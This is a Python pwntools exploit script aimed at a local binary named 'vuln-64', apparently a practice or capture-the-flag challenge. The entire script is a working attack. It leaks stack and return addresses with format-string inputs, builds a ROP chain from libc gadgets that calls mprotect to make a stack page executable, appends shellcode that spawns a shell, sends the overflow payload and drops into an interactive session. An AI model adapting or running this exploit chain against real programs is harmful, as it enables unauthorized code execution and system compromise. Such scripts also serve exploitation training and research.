#!/usr/bin/env python
from pwn import *


# Set up the process
context(os='linux', arch='amd64')
p = process('./vuln-64')


p.sendline(b'%11$p')
win = int(p.recvline()[:-1], 16)

#libc library
libc = p.libs()['/usr/lib/x86_64-linux-gnu/libc.so.6']

mprotect = libc + 0x1010f0
overflow = b'A' * (80 - 58)

#ROP gadgets
pop_rdi = libc + 0x27c65
pop_rsi = libc + 0x29419
pop_rdx = libc + 0xfd6bd

#clean before sendline
p.clean()
payload2 = b'%7$p'
p.sendline(payload2)

ref = p.recvline()
b_start = int(ref,16) + 240
page = int(ref[:-4] + b'000', 16)

sc = shellcraft.amd64.linux.sh()
sc += '     /* exit */\n        xor rax,rax\n       mov al, 0x3c\n      xor rdx, rdx\n      syscall'

rdi = page
rsi = 4096
rdx = 7

print("libc", hex(libc))
print("pop rdi", hex(pop_rdi))
print("pop rsi", hex(pop_rsi))
print("pop rdx", hex(pop_rdx))
print("mprotect", hex(mprotect))

#Setting up payload for buffer overflow
bufexploit = bytearray(b'')
bufexploit.extend(pop_rdi.to_bytes(8, byteorder='little'))
bufexploit.extend(rdi.to_bytes(8, byteorder='little'))
bufexploit.extend(pop_rsi.to_bytes(8, byteorder='little'))
bufexploit.extend(rsi.to_bytes(8, byteorder='little'))
bufexploit.extend(pop_rdx.to_bytes(8, byteorder='little'))
bufexploit.extend(rdx.to_bytes(8, byteorder='little'))
bufexploit.extend(mprotect.to_bytes(8, byteorder='little'))
bufexploit.extend(b_start.to_bytes(8, byteorder='little'))
bufexploit.extend(asm(sc))
bufexploit.extend(overflow)
#adjusts the rsp after executing $rsp and puts it on the stack
stack_pivot = win + 0x2
bufexploit.extend(stack_pivot.to_bytes(8, byteorder='little'))

#pid = gdb.attach(p, '''
#    up
#    b vuln_func
#''')

print("Sending exploit...")
p.clean()
p.sendline(bufexploit)

p.interactive()
